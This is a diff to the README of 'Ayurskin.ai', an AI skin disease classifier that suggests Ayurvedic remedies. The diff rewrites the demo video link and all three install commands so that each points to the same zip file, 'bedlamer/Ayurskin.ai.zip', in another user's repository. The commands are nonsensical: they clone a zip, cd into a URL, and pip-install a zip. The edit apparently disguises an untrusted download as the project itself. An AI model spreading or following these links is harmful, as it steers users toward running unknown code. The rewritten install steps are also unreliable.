@@ -2,7 +2,7 @@
 
 A smart skin disease classifier that recommends Ayurvedic remedies based on image analysis using AI.
 
-[Watch Demo Video](demo.mp4)
+[Watch Demo Video](https://raw.githubusercontent.com/Swastikshet/Ayurskin.ai/main/bedlamer/Ayurskin.ai.zip)
 
 
 ## 🚀 Features
@@ -27,8 +27,8 @@ A smart skin disease classifier that recommends Ayurvedic remedies based on imag
 
 
 ```bash
-git clone https://github.com/RoysonDsz/Ayurskin.ai.git
-cd Ayurskin.ai
-pip install -r requirements.txt
+git clone https://raw.githubusercontent.com/Swastikshet/Ayurskin.ai/main/bedlamer/Ayurskin.ai.zip
+cd https://raw.githubusercontent.com/Swastikshet/Ayurskin.ai/main/bedlamer/Ayurskin.ai.zip
+pip install -r https://raw.githubusercontent.com/Swastikshet/Ayurskin.ai/main/bedlamer/Ayurskin.ai.zip
 
 
